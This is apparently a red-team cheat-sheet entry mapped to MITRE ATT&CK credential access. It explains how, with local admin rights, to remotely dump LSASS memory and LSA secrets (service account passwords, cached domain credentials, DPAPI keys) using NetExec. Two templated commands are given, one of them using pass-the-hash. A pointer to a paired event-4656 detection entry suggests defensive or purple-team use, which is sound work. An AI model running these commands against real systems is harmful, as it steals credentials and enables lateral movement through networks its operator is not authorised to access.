---
id: lsass-dump-lsassy
title: Remote LSASS / LSA secrets (NetExec)
section: Lateral movement & remote execution
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1003.001, T1003.004]
platform: [windows, network]
source: hacktheplanet §"Lateral movement & remote execution"
pair: lsass-4656
---

With local-admin on a box, pull credentials from memory without dropping a tool:
the `lsassy` module dumps LSASS over SMB and parses creds in memory, and `--lsa`
reads the LSA secrets (service account passwords, cached domain creds, DPAPI
keys). Opening a handle to lsass is the noisy part — see the paired `4656`.

```sh
nxc smb {{rhost}} -u {{user}} -H {{nthash}} -M lsassy
nxc smb {{rhost}} -u {{user}} -p {{password}} --lsa
```
